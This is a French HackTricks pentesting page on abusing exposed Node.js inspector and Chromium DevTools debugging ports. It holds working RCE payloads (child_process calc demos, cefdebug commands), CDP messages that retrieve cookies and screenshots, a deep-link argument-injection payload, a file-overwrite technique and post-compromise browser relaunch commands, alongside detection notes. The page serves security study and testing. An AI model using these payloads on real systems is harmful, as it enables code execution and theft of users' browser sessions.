# Abus du débogage de Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Parmi les exemples pratiques historiques figurent le walkthrough Multimaster et l’attaque du debugger de Visual Studio Code CVE-2019-1414 ; utilisez-les comme contexte propre à certaines versions plutôt que de supposer que toutes les cibles Electron ou Chromium actuelles exposent les mêmes primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Informations de base

[Selon la documentation](https://nodejs.org/learn/getting-started/debugging) : lorsqu’un processus Node.js est démarré avec l’option `--inspect`, il écoute les clients de débogage. Par **défaut**, il écoute sur l’hôte et le port **`127.0.0.1:9229`**. Chaque processus se voit également attribuer un **UUID** **unique**.<sup>[[4]](#references)</sup>

Les clients Inspector doivent connaître et spécifier l’adresse de l’hôte, le port et l’UUID pour se connecter. Une URL complète ressemble à `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Comme le **debugger a un accès complet à l’environnement d’exécution de Node.js**, un acteur malveillant capable de se connecter à ce port peut être en mesure d’exécuter du code arbitraire au nom du processus Node.js (**élévation potentielle de privilèges**).<sup>[[4]](#references)</sup>

Il existe plusieurs façons de démarrer un Inspector :<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Lorsque vous démarrez un processus en cours d’inspection, quelque chose comme ceci apparaît :<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Les processus reposant sur **CEF** (**Chromium Embedded Framework**) peuvent exposer un débogueur avec `--remote-debugging-port=9222`. Cela expose le navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) plutôt que via un inspecteur Node.js, les payloads basés sur `process` de Node.js ne sont donc pas directement applicables par défaut.<sup>[[2]](#references)[[5]](#references)</sup>

Lorsque vous démarrez un navigateur en mode débogage, quelque chose comme ceci apparaît :<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Énumérer et piloter un endpoint CDP

Les endpoints de découverte HTTP distinguent le WebSocket du **navigateur** des WebSockets des **cibles** individuelles (onglet, worker, extension, etc.). Interrogez `/json/version` pour obtenir l'endpoint du navigateur et `/json/list` pour les cibles ; les valeurs `webSocketDebuggerUrl` renvoyées peuvent ensuite être pilotées directement avec les messages de type JSON-RPC de CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Par exemple, connectez-vous avec `websocat "$BROWSER_WS"` et envoyez `{"id":1,"method":"Target.getTargets"}` ou `{"id":2,"method":"Storage.getCookies"}`. Sur une cible de page (`websocat "$PAGE_WS"`), `Runtime.evaluate` s’exécute dans le renderer et `Page.captureScreenshot` renvoie une capture d’écran encodée en base64. `document.cookie` ne peut pas révéler les cookies `HttpOnly`, tandis que `Storage.getCookies` interroge le magasin de cookies du navigateur.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Navigateurs, WebSockets et politique de même origine <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Les sites web ouverts dans un navigateur peuvent effectuer des requêtes WebSocket et HTTP dans le cadre du modèle de sécurité du navigateur. Une **connexion HTTP initiale** est nécessaire pour **obtenir un identifiant de session de débogueur unique**. La **politique de même origine** **empêche** les sites web d’établir **cette connexion HTTP**. Pour se protéger davantage contre les [**attaques DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js vérifie que les **en-têtes 'Host'** de la connexion indiquent soit une **adresse IP**, soit précisément **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Cette **mesure de sécurité empêche d’exploiter l’inspecteur** pour exécuter du code en **envoyant simplement une requête HTTP** (ce qui pourrait être fait en exploitant une vuln SSRF).<sup>[[4]](#references)</sup>

### Démarrer l’inspecteur dans des processus en cours d’exécution

Vous pouvez envoyer le **signal SIGUSR1** à un processus nodejs en cours d’exécution pour le faire **démarrer l’inspecteur** sur le port par défaut. Toutefois, notez que vous devez disposer de privilèges suffisants. Cela peut donc vous accorder un **accès privilégié aux informations contenues dans le processus**, mais pas une élévation directe de privilèges.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Cela est utile dans les conteneurs, car **arrêter le processus et en démarrer un nouveau** avec `--inspect` **n’est pas une option**, puisque le **conteneur** sera **arrêté** avec le processus.<sup>[[6]](#references)</sup>

### Se connecter à l’inspector/debugger

Pour se connecter à un **navigateur basé sur Chromium**, les URL `chrome://inspect` ou `edge://inspect` peuvent être consultées pour Chrome ou Edge, respectivement. En cliquant sur le bouton Configure, il faut s’assurer que **l’hôte cible et le port** sont correctement répertoriés. L’image montre un exemple de Remote Code Execution (RCE) :<sup>[[2]](#references)[[4]](#references)</sup>

![Une URL permettant d’accéder au debugger apparaîtra. Par exemple : ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Se connecter à l’inspector/debugger : pour se connecter à un navigateur basé sur Chromium, ...](<../../images/image (674).png>)

En utilisant la **ligne de commande**, vous pouvez vous connecter à un debugger/inspector avec :<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

L’outil [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permet de **trouver les inspecteurs** exécutés localement et d’y **injecter du code**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Notez que les exploits **RCE** NodeJS ne fonctionneront pas si la connexion au navigateur se fait via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (vous devez consulter l’API pour trouver des choses intéressantes à faire avec).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE dans le débogueur/inspecteur NodeJS

> [!TIP]
> Si vous êtes arrivé ici en cherchant comment obtenir une [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Parmi les moyens courants d’obtenir une **RCE** lorsque vous pouvez **vous connecter** à un **inspector** Node, on peut utiliser quelque chose comme (il semble que cela **ne fonctionnera pas avec une connexion au Chrome DevTools Protocol**).<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

Vous pouvez consulter l’API ici : [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Dans cette section, je vais simplement lister des utilisations intéressantes de ce protocole pour exploiter des systèmes.

### Restriction du profil par défaut à partir de Chrome 136

À partir de **Chrome 136**, Chrome ignore `--remote-debugging-port` et `--remote-debugging-pipe` lorsque ces options ciblent le **répertoire de données Chrome par défaut**. Ces options doivent être associées à un `--user-data-dir` non standard, dont la clé de chiffrement distincte et l’état de navigateur isolé empêchent la technique simple basée sur des options d’exposer le profil normal authentifié de l’utilisateur. Il ne faut pas supposer que cette restriction propre à Chrome s’applique aux anciennes versions de Chrome, à Chrome for Testing, aux applications Electron/CEF ou à d’autres dérivés de Chromium sans vérification.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Ainsi, voir un processus Chrome actuel lancé uniquement avec `--remote-debugging-port` ne prouve **pas** que CDP est devenu actif. Vérifiez le listener et `/json/version`, et déterminez quel profil l'utilise réellement.<sup>[[14]](#references)</sup>

### Injection de paramètres via des liens profonds

Dans [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security a découvert qu'une application basée sur CEF avait **enregistré un URI personnalisé** dans le système (workspaces://index.html), recevait l'URI complet, puis **lançait l'application basée sur CEF** avec une configuration partiellement construite à partir de cet URI.<sup>[[8]](#references)</sup>

Il a été découvert que les paramètres de l'URI étaient décodés depuis leur format URL et utilisés pour lancer l'application CEF de base, ce qui permettait à un utilisateur d'**injecter** le flag **`--gpu-launcher`** dans la **ligne de commande** et d'exécuter des commandes arbitraires.<sup>[[8]](#references)</sup>

Ainsi, un payload comme :

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Exécutera un calc.exe.<sup>[[8]](#references)</sup>

### Écraser des fichiers

Modifiez le dossier où les **fichiers téléchargés seront enregistrés** et téléchargez un fichier pour **écraser** le **code source** fréquemment utilisé par l’application avec votre **code malveillant**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE et exfiltration via WebDriver

STAR Labs a montré que des services WebDriver/CDP exposés peuvent permettre la lecture arbitraire de fichiers et le RCE ; le DNS rebinding peut compléter la chaîne d’exploitation dans certaines configurations.<sup>[[9]](#references)</sup>

Le service WebDriver de ChromeDriver est distinct de Chrome DevTools/CDP. Sa capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) sélectionne l’exécutable du navigateur lancé pour une nouvelle session. Si un utilisateur non privilégié peut accéder à un service ChromeDriver exécuté en tant que root et lui soumettre une session avec un chemin d’exécutable contrôlé par l’utilisateur, ce lancement peut franchir la frontière de privilèges du service. Une réponse `/sessions` vide ne permet pas de déterminer si de nouvelles sessions peuvent être créées. Avant de conclure que cette voie est exploitable, vérifiez le propriétaire du processus, l’accessibilité réelle du listener, l’autorisation des sessions, l’accès à l’exécutable et les mécanismes de confinement ; le nom du processus ou le port habituel ne suffisent pas. [Les recommandations de sécurité de Google](https://developer.chrome.com/docs/chromedriver/security-considerations) préconisent d’exécuter ChromeDriver sous un compte non privilégié. L’énumération passive ne doit pas créer de session WebDriver.

Pour d’autres cas historiques liés à l’automatisation des navigateurs et à la sécurité de Chromium, consultez l’article de Counter WebDriver et les issues 773, 1742 et 1944 de Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Activation de CDP dans un processus Chromium en cours d’exécution

Sous Windows, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) a montré que la restriction de la ligne de commande n’est pas le seul moyen d’activer CDP : du code capable d’injecter du code dans un `msedge.exe` existant peut appeler la fonction non exportée de Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` et exposer le profil actif authentifié sans redémarrer le navigateur.<sup>[[15]](#references)</sup>

La chaîne démontrée injecte une DLL avec `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, résout les symboles internes d’Edge (d’abord à partir des PDB, puis avec des signatures d’octets propres à chaque version), sous-classe la fenêtre du navigateur et poste un message pour que l’appel final de démarrage du serveur s’exécute sur le **thread UI** du navigateur. Le socket est lié à l’interface loopback, après quoi les primitives CDP habituelles permettent de récupérer les cookies, capturer les onglets, inspecter le trafic réseau ou exécuter du JavaScript dans des pages authentifiées.<sup>[[15]](#references)</sup>

> [!WARNING]
> Il s’agit d’une technique de **post-compromission/injection de processus**, et non d’un contournement réseau non authentifié. Elle dépend fortement de la build, car les symboles C++ concernés ne sont pas exportés et les signatures peuvent changer après les mises à jour du navigateur.<sup>[[15]](#references)</sup>

Pour la détection, ne vous fiez pas uniquement à la télémétrie de la ligne de commande `--remote-debugging-*` : corrélez également les handles inhabituels et les opérations mémoire visant les processus du navigateur (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, création de threads), l’injection de DLL et les sockets loopback en écoute inattendus appartenant à Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Dans un environnement réel et **après avoir compromis** le PC d’un utilisateur qui utilise un navigateur basé sur Chromium, une technique historique consistait à relancer le navigateur avec le débogage activé et à transférer le port loopback. Cela peut exposer l’état de navigation de la victime sur les produits/builds qui acceptent encore le profil sélectionné, mais Chrome 136+ ne l’autorisera pas avec son répertoire de données par défaut.<sup>[[7]](#references)[[14]](#references)</sup>

La commande de relancement originale est conservée ci-dessous pour les cibles anciennes ou propres à certaines versions. La deuxième commande est la méthode prise en charge par les versions actuelles de Chrome, mais elle crée un profil isolé au lieu de rouvrir l’état authentifié normal de la victime.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Pour les techniques spécifiques à macOS de relance de Chromium, d’extension et de CDP, voir [Injection Chromium sur macOS](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Outil d’inspection et d’exploitation du débogueur CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414 : exécution de code à distance via le débogueur Chrome DevTools de Visual Studio Code](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guide de débogage Node.js - Premiers pas](https://nodejs.org/learn/getting-started/debugging)
- [5] [Protocole Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Compte rendu de corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-exploitation : abuser de la fonctionnalité de débogage de Chrome pour observer et contrôler des sessions de navigation à distance](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112 : exécution de code à distance dans AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Vous me parlez ? - Exécution de code à distance via WebDriver, DNS rebinding et CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contre WebDriver - Du bot à l’exécution de code à distance](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Problème 773 de Google Project Zero (suivi des bugs Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Problème 1742 de Google Project Zero (suivi des bugs Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Problème 1944 de Google Project Zero (suivi des bugs Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Modifications des options de débogage à distance pour améliorer la sécurité - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injection de CDP dans un navigateur Edge en cours d’exécution : analyse approfondie de l’instrumentation de navigateur à l’exécution](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
